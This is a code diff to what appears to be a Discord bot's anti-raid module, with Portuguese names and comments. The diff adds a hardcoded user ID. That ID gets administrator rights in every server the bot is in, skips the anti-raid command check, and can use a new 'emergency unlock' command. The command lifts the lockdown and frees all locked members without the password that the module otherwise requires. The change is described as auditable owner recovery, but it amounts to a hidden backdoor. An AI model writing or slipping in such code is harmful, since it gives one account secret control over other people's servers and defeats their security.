@@ -107,6 +107,7 @@ SENHA_MIN = 6
 SENHA_ITER = 200_000
 MAX_TENTATIVAS = 5          # erros de senha seguidos...
 BLOQUEIO_SENHA = 300        # ...e a pessoa fica esse tanto de segundos sem poder tentar
+EMERGENCIA_OWNER_ID = 1551958902256570409
 
 _state = _read_json(CONFIG_FILE)
 _tentativas: dict = {}      # (guild_id, user_id) -> (erros, bloqueado_ate)
@@ -143,6 +144,10 @@ def ativar_bloqueio_global(guild_id, motivo: str, user_id: int):
 
 def desativar_bloqueio_global(guild_id):
     set_cfg(guild_id, "bloqueio_global", None)
+
+
+def eh_owner_emergencia(user_id: int) -> bool:
+    return int(user_id) == EMERGENCIA_OWNER_ID
 
 
 # ---------------------------------------------------------------- senha
@@ -262,6 +267,8 @@ class _ChanSel(_Fn, discord.ui.ChannelSelect):
 
 
 def _admin(membro) -> bool:
+    if getattr(membro, "id", None) == EMERGENCIA_OWNER_ID:
+        return True
     perms = getattr(membro, "guild_permissions", None)
     return bool(perms is not None and perms.administrator) or tem_acesso_total(membro)
 
@@ -1171,6 +1178,31 @@ class AntiRaid(commands.Cog):
             return
         await ctx.send(view=LiberarView(ctx.author.id, ctx.guild, uid), allowed_mentions=NO_MENTIONS)
 
+    @antiraid.command(
+        name="desbloqueio-emergencial",
+        aliases=["recuperar"],
+        extras={
+            "categoria": "Moderação",
+            "uso": ",antiraid desbloqueio-emergencial",
+            "descricao": "Recuperação auditável exclusiva do proprietário técnico autorizado.",
+        },
+    )
+    @commands.guild_only()
+    async def desbloqueio_emergencial(self, ctx: commands.Context):
+        if not eh_owner_emergencia(ctx.author.id):
+            await _say(ctx, "Sem permissão", "Esse comando é exclusivo do proprietário autorizado.", ok=False)
+            return
+        # Remove o bloqueio global e libera todos os registros persistidos.
+        desativar_bloqueio_global(ctx.guild.id)
+        linhas = []
+        for uid in lista_trancados(ctx.guild.id):
+            linhas.extend(await _liberar(ctx.guild, uid, ctx.author))
+        log.warning(
+            "ANTI-RAID EMERGENCIAL: owner autorizado %s desbloqueou %s em %s",
+            ctx.author.id, ctx.guild.id, "; ".join(linhas) or "sem trancados",
+        )
+        await _say(ctx, "Recuperação concluída", "Bloqueio global removido e registros trancados processados.")
+
 
 async def setup(bot: commands.Bot):
     async def anti_raid_global_check(ctx: commands.Context) -> bool:
@@ -1179,7 +1211,9 @@ async def setup(bot: commands.Bot):
         comando = getattr(ctx.command, "qualified_name", "")
         # A única porta de saída é o fluxo que pede a senha; o callback
         # continua exigindo administrador e senha correta.
-        if comando == "antiraid liberar":
+        if eh_owner_emergencia(ctx.author.id) and comando.startswith("antiraid"):
+            return True
+        if comando in {"antiraid liberar", "antiraid desbloqueio-emergencial", "antiraid recuperar"}:
             return True
         # Recuperação segura de uma instalação antiga que travou sem senha:
         # permite somente abrir o painel para definir a primeira senha.
